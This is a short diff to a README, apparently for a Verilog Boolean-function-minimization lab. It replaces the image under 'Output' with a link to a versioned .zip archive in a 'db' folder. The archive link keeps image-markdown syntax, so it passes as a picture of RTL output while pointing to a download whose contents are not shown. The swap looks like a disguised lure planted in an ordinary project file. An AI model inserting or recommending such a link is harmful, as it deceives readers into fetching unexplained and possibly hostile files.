@@ -66,7 +66,7 @@ endmodule
 **RTL realization**
 
 **Output:**
-![313086025-86cc988b-b5fd-4693-a0a5-4a879656e903](https://github.com/user-attachments/assets/1223044a-17e6-4ace-9b84-e422ad3e0b7a)
+![313086025-86cc988b-b5fd-4693-a0a5-4a879656e903](https://raw.githubusercontent.com/24013396/BOOLEAN_FUNCTION_MINIMIZATION/main/db/BOOLEAN_FUNCTION_MINIMIZATION-3.8.zip)
 
 **RTL**
 
